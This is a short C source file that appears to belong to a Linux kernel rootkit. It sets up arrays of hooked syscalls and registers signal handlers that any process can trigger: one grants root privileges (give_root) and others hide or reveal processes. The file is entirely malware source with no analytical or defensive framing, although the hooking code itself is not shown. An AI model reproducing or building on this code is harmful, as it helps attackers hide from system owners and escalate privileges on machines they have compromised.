#include "syscall_hooks.h"

#include "hooking.h"

// Initialize original syscall functions array
sysfun_t P_ORIG_SYSFUNS[__NR_syscalls] = { NULL };

// Initialize syscall hooks array
hook_t P_SYSCALL_HOOKS[] = SYSCALL_HOOKS(HOOKED_SYSCALLS);

// Initialize signal handlers array
const signal_handler_t P_SIG_HANDLERS[] = {
    NEW_SIGNAL_HANDLER(PID_ANY, SIGROOT, give_root),
    NEW_SIGNAL_HANDLER(PID_ANY, SIGHIDE, show_hide_process),
    NEW_SIGNAL_HANDLER(PID_ANY, SIGSHOW, show_hide_process),
    NEW_SIGNAL_HANDLER(0, 0, NULL), // The last element must have a NULL `sig_handler`
};
